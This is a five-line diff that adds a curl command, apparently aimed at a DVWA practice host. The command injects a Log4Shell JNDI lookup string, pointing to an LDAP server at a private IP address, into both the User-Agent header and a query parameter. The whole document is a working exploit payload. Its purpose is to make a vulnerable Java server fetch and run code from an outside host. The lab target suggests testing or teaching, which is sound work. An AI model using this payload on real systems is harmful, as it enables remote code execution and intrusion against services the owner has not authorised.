@@ -1,0 +1,5 @@
+curl -i --max-time 15 --get \
+  -A '${jndi:ldap://192.168.0.108:1389/a}' \
+  --data-urlencode \
+  'q=${jndi:ldap://192.168.0.108:1389/a}' \
+  http://dvwa.ccc.com/
